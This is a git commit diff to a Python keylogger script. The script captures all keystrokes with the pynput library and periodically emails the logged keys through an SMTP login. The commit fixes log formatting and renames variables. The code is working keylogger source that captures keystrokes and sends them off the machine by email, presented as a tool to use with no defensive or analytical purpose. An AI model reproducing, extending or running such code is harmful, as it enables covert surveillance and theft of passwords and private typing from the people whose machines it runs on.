58465d97843e920905dd50596d75c7116e7f5ca6
Kgg9 <Kartikeyg910@gmail.com>
2021-04-24 02:26:33 -0400

    Fixed some glitches with the keystrokes, problem was the formatting of the log variable

--- Email-Keylogger.py
+++ Email-Keylogger.py
@@ -1,4 +1,5 @@
 
+
 # keystroke listener module
 from pynput.keyboard import Listener, Key
 
@@ -24,10 +25,10 @@ print('''
 
 numLet = [i for i in ascii_letters] + [1,2,3,4,5,6,7,8,9,0]
 
-email = input("What Is Your Email: ")
-password = input("What Is Your Password (Don't Worry We're Not Stealing It, Check The Github If You Don't Believe It): ")
+Email = input("What Is Your Email: ")
+password = input("What Is Your Password (Don't Worry We're Not Stealing It): ")
 
-log = "\n"
+log = ' '
 keyLog = ""
 
 char_length = int(input("What Would You Like The Character Limit To Be Before The Email Is Sent: "))
@@ -38,7 +39,7 @@ def sendMail(email,password, msg):
             server.login(email, password)
             server.sendmail(email,email,msg)
     except:
-        print("\n Something Went Wrong Check To See Whether Your Email Or Password Is Right Or Check The FAQ On Github")
+        print("\n Something Went Wrong Check To See Whether Your Email Or Password is Right")
 
 
 def keystroke(key):
@@ -49,11 +50,12 @@ def keystroke(key):
     global keyLog
     global char_length
 
+    #Keystrokes message sender
     if key not in numLet:
-        log+=f" {keyLog} \n " + f" {key} \n "
-        keyLog =""
+        log+= '\n\n' f" {keyLog} \n {key} "   #'\n\n' works to ensure that the keystrokes show up as the message
+        keyLog = ""
         if len(log) >= char_length:
-            sendMail(email, password, log)
+            sendMail(Email, password, log)
             log = ""
     elif key in numLet:
         keyLog += key
@@ -65,6 +67,4 @@ with Listener(on_press=keystroke) as Listener:
 
 
 
-
-
-
+input()
